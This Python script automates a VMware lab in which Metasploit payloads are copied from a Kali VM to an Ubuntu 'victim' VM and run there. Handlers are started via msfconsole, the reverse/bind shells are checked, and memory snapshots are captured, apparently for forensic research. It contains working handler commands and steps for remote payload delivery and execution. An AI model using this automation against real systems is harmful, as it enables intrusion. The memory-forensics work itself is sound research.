
# Program is responsible for generating memory dumps for various metasploit payloads
# Program is developed on Windows 11 and Python 3.12.9
# Prerequisites:
#   VMware Workstation Pro installed on Windows machine with Ubuntu VM and Kali VM configured
#   Attacker machine used: Kali
#   Victim machine used: Ubuntu
#       Dependency: openssh-server (To use ssh & scp commands)
#   Add public key to both attacker(kali) and victim(ubuntu) machines to access via ssh from windows
#   Add both attacker and victim machine to windows known hosts
#   Execute: ssh-keygen -t rsa
#   Copy public key to victim: ssh-copy-id user@victim_ip
#   Copy public key to attacker: ssh-copy-id user@attacker_ip
#   Provide all configurations in pipeline_config.json file before executing the script
# Version: 1.0


import json
import os
import shutil
import subprocess 
import sys
import time

current_dir = os.path.dirname(os.path.abspath(__file__))

def execute_system_command(cmd):
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout


def create_directory_if_not_exists(inp_dir):
    if not os.path.exists(inp_dir):
        os.makedirs(inp_dir)


def extract_payload_names_with_staging(raw_payloads):
    # payloads = raw_payloads.split()
    # formatted_payloads = []

    parts = raw_payloads.split('_')
    suffix = parts[-1].split('.')[0]  # Normalize 'staged.elf' -> 'staged'
    idx = None

    if suffix == 'staged':
        if 'shell' in parts:
            idx = parts.index('shell') + 1
        elif 'meterpreter' in parts:
            idx = parts.index('meterpreter') + 1
    elif suffix == 'stageless':
        if 'shell' in parts:
            idx = parts.index('shell')
        elif 'meterpreter' in parts:
            idx = parts.index('meterpreter')

    if idx is not None:
        formatted_payload = '/'.join(parts[:idx]) + '/' + '_'.join(parts[idx:-1])  # Exclude suffix

    return formatted_payload


class DumpGeneration:

    def __init__(self):
        self.config_file = os.path.join(current_dir, "pipeline_config.json")
        self.config = {}
        self.get_all_config_info()
        # print(self.config)

        self.ubuntu_revert_command = ["vmrun", "revertToSnapshot", os.path.join(self.config["ubuntu_vm_folder"], self.config["ubuntu_vm_file"]), self.config["clean_snapshot"]]
        self.ubuntu_start_command = ["vmrun", "start", os.path.join(self.config["ubuntu_vm_folder"], self.config["ubuntu_vm_file"])]

        self.dumps_dir = os.path.join(current_dir, "memory_dumps")
        create_directory_if_not_exists(self.dumps_dir)

        
    def get_all_config_info(self):
        with open(self.config_file, 'r') as cfg:
            self.config = json.load(cfg)

    
    def is_vm_running(self, max_retries=10):
        for attempt in range(max_retries):
            status_command = ["ssh", f"{self.config["victim_user"]}@{self.config["victim_ip"]}", "systemctl", "is-system-running"]
            result = execute_system_command(status_command)
            if result.strip() == "running":
                return True

            time.sleep(4)

        return False

    def run_msf_handler_screen(self, payload, type):
        """
        Starts a Metasploit handler in a persistent tmux session via SSH.

        :param payload: Metasploit payload string
        :param type: 'reverse' or 'bind'
        :param session_name: Name of the tmux session
        """

        if type == "reverse":
            if "ipv6" in payload:
                lhost = self.config["attacker_ipv6"]
            else:
                lhost = self.config["attacker_ip"]
            msf_commands = 'use exploit/multi/handler; set PAYLOAD {0}; set LHOST {1}; set LPORT {2}; run'.format(payload, lhost, self.config["attacker_port"])
        elif type == "bind":
            if "ipv6" in payload:
                rhost = self.config["victim_ipv6"]
            else:
                rhost = self.config["victim_ip"]
            msf_commands = 'use exploit/multi/handler; set PAYLOAD {0}; set RHOST {1}; set LPORT {2}; run'.format(payload, rhost, self.config["attacker_port"])
        else:
            raise ValueError("Invalid type. Must be 'reverse' or 'bind'.")
        print(msf_commands)
        tmux_cmd = "tmux new-session -d -s {0} \"msfconsole -q -x '{1}'\"".format(self.config["attacker_tmux_session"], msf_commands)

        ssh_cmd = ["ssh", f"{self.config["attacker_user"]}@{self.config["attacker_ip"]}", tmux_cmd]

        execute_system_command(ssh_cmd)

    
    def obtain_snapshot_details(self):
        with open(os.path.join(self.config["ubuntu_vm_folder"], self.config["Ubuntu_vmsd_file"])) as vmsd_content:
            lines = vmsd_content.read().strip().splitlines()

            # Track snapshot blocks
            current_snapshot = None

            for line in lines:
                line = line.strip()
                if line.startswith("snapshot") and ".displayName" in line:
                    key, value = line.split("=", 1)
                    snapshot_id = key.split('.')[0]
                    display_name = value.strip().strip('"')
                    if display_name == self.config["forensics_snapshot"]:
                        current_snapshot = snapshot_id

            for line in lines:
                line = line.strip()    
                if current_snapshot and line.startswith(current_snapshot + ".filename"):
                    key, value = line.split("=", 1)
                    vmsn_filename = value.strip().strip('"')
                    vmem_filename = vmsn_filename.replace(".vmsn", ".vmem")
                    return vmem_filename, vmsn_filename

    def hard_stop_victim_machine(self):
        print("Hard stopping victim machine")
        vm_shutdown_cmd = ["vmrun", "-T", "ws", "stop", os.path.join(self.config["ubuntu_vm_folder"], self.config["ubuntu_vm_file"]), "hard"]
        execute_system_command(vm_shutdown_cmd)

    
    def revert_and_start_victim_machine(self):
        # Revert Ubuntu to Clean State
        print("Reverting victim machine to clean snapshot...")
        execute_system_command(self.ubuntu_revert_command)
        # Start Ubuntu VM
        print("Starting victim machine...")
        execute_system_command(self.ubuntu_start_command)
        if self.is_vm_running():
            print("VM is running.")
        else:
            print("VM did not start within the expected time.")
            self.hard_stop_victim_machine()
            self.revert_and_start_victim_machine()

    def set_ipv6_unique_local_address(self):        
        #adding ipv6 unique local address to the victim machine
        ula_cmd_attacker = ["ssh", f"{self.config["attacker_user"]}@{self.config["attacker_ip"]}", "echo", self.config["attacker_password"], "|", "sudo", "-S", "ip", "-6", "addr", "add", f"{self.config["attacker_ipv6"]}/64", "dev", self.config["victim_interface"]]
        execute_system_command(ula_cmd_attacker)

        ula_cmd_victim = ["ssh", f"{self.config["victim_user"]}@{self.config["victim_ip"]}", "echo", self.config["victim_password"], "|", "sudo", "-S", "ip", "-6", "addr", "add", f"{self.config["victim_ipv6"]}/64", "dev", self.config["victim_interface"]]
        execute_system_command(ula_cmd_victim)

    def execute_payload_in_victim_machine(self):
        # Execute command
        print("Executing payload...")
        # Create tmux sessions
        payload_execution_cmd = ["ssh", f"{self.config["victim_user"]}@{self.config["victim_ip"]}", f"nohup /home/{self.config["victim_user"]}/{self.config["payload_name"]} >/dev/null 2>&1 < /dev/null &"]
        print(payload_execution_cmd)
        execute_system_command(payload_execution_cmd)


    def transfer_and_execute_payload(self, full_file_path):
        # Transfer payload to victim machine
        print("Transfering payload to victim machine...")
        transfer_cmd = ["scp", f"{self.config["attacker_user"]}@{self.config["attacker_ip"]}:{full_file_path}", f"{self.config["victim_user"]}@{self.config["victim_ip"]}:/home/{self.config["victim_user"]}/{self.config["payload_name"]}"]
        execute_system_command(transfer_cmd)

        time.sleep(2)

        # Set execution permission to the payload
        print("Set execute permission to payload...")
        permission_cmd = ["ssh", f"{self.config["victim_user"]}@{self.config["victim_ip"]}", "chmod", "+x", f"/home/{self.config["victim_user"]}/{self.config["payload_name"]}"]
        execute_system_command(permission_cmd)

        self.execute_payload_in_victim_machine()

    def terminate_metasploit_listener(self):
        # Terminate metasploit handler/listener (if any existing session is still alive)
        print("Terminating metasploit listener...")
        tmux_session_cmd = ["ssh", f"{self.config["attacker_user"]}@{self.config["attacker_ip"]}", "tmux", "kill-session", "-t", self.config["attacker_tmux_session"]]
        execute_system_command(tmux_session_cmd)

    def terminate_payload_execution(self):
        # Terminate metasploit handler/listener (if any existing session is still alive)
        print("Terminating payload execution...")
        payload_kill_cmd = ["ssh", f"{self.config["victim_user"]}@{self.config["victim_ip"]}", f"pkill -f /home/{self.config["victim_user"]}/{self.config["payload_name"]}"]
        print(payload_kill_cmd)
        execute_system_command(payload_kill_cmd)

    def retry_payload_execution(self, formatted_payload):
        print("Retrying payload execution...")
        self.terminate_metasploit_listener()
        self.terminate_payload_execution()
        # Creating Reverse Handler
        if "reverse" in formatted_payload:
            self.run_msf_handler_screen(formatted_payload, "reverse")
            time.sleep(10)
        self.execute_payload_in_victim_machine()
        # Creating Bind Handler
        if "bind" in formatted_payload:
            self.run_msf_handler_screen(formatted_payload, "bind")
            time.sleep(10)

    def verify_payload_execution(self, formatted_payload):
        # Verify connection established
        print("Verify reverse/bind shell connection establishment...")
        if "sctp" in formatted_payload:
            ss_cmd = f"ss -A sctp | grep {self.config["attacker_port"]}"
        else:
            ss_cmd = f"ss -tuna | grep {self.config["attacker_port"]}"

        verify_cmd = ["ssh", f"{self.config["attacker_user"]}@{self.config["attacker_ip"]}", ss_cmd]
        verify_output = execute_system_command(verify_cmd)
        if "ESTAB" in verify_output:
            print("Payload Execution is successful.")
        else:
            print("Reverse/Bind connection was not established")
            self.retry_payload_execution(formatted_payload)
            time.sleep(10)
            self.verify_payload_execution(formatted_payload)

    def capture_memory_dump(self):
        # Captutring memory dump
        print("Capturing memory dump via vmware snapshot...")
        snapshot_cmd = ["vmrun", "-T", "ws", "snapshot", os.path.join(self.config["ubuntu_vm_folder"], self.config["ubuntu_vm_file"]), self.config["forensics_snapshot"]]
        print(execute_system_command(snapshot_cmd))

    def backup_memory_dump_for_analysis(self, snapshot_file, snapshot_vmsn, payload):
        # Copy Memory dump file
        print("Copying memory dump for analysis...")
        dump_file_path = os.path.join(self.config["ubuntu_vm_folder"], snapshot_file)
        dump_vmsn_path = os.path.join(self.config["ubuntu_vm_folder"], snapshot_vmsn)
        dest_dump = os.path.join(self.dumps_dir, f"{payload}.vmem")
        dest_vmsn = os.path.join(self.dumps_dir, f"{payload}.vmsn")
        shutil.copy2(dump_file_path, dest_dump)
        shutil.copy2(dump_vmsn_path, dest_vmsn)

    def cleanup_memory_dump_snapshot(self):
        # Deleting memory dump snapshot
        print("Deleting memory dump snapshot...")
        delete_snapshot_cmd = ["vmrun", "-T", "ws", "deleteSnapshot", os.path.join(self.config["ubuntu_vm_folder"], self.config["ubuntu_vm_file"]), self.config["forensics_snapshot"]]
        execute_system_command(delete_snapshot_cmd)

    def shutdown_victim_machine(self):
        # shutdown the vm
        print("Shutting down the victim machine...")
        vm_shutdown_cmd = ["vmrun", "-T", "ws", "stop", os.path.join(self.config["ubuntu_vm_folder"], self.config["ubuntu_vm_file"]), "soft"]
        execute_system_command(vm_shutdown_cmd)

    def process_all_payloads(self):
        # Obtain all the paylaods to be processed
        payloads = execute_system_command(["ssh", f"{self.config["attacker_user"]}@{self.config["attacker_ip"]}", "ls", self.config["payload_dir"]]).strip().split("\n")

        for payload in payloads:

            self.terminate_metasploit_listener()

            print("Processing: {0}".format(payload))
            full_file_path = os.path.join(self.config["payload_dir"], payload)
            formatted_payload = extract_payload_names_with_staging(payload)

            self.revert_and_start_victim_machine()

            if "ipv6" in payload:
                self.set_ipv6_unique_local_address()

            # Creating Reverse Handler
            if "reverse" in formatted_payload:
                print("Starting metasploit reverse handler...")
                self.run_msf_handler_screen(formatted_payload, "reverse")
                time.sleep(10)

            self.transfer_and_execute_payload(full_file_path)

            # Creating Bind Handler
            if "bind" in formatted_payload:
                print("Starting metasploit bind handler...")
                self.run_msf_handler_screen(formatted_payload, "bind")

            time.sleep(10)

            self.verify_payload_execution(formatted_payload)
           
            print("Sleeping for 30 seconds...")
            time.sleep(30)

            self.capture_memory_dump()

            print("Obtaining snapshot details...")
            snapshot_file, snapshot_vmsn = self.obtain_snapshot_details()

            if not snapshot_file:
                print("Snapshot not found")
                sys.exit(0)
            
            self.backup_memory_dump_for_analysis(snapshot_file, snapshot_vmsn, payload)

            self.terminate_metasploit_listener()

            self.cleanup_memory_dump_snapshot()

            self.shutdown_victim_machine()

            print("Memory dump obtained for the payload: {0}".format(formatted_payload))
            print("Dumps will be located at {0}\n\n".format(self.dumps_dir))


if __name__ == "__main__":
    generate_dump = DumpGeneration()
    generate_dump.process_all_payloads()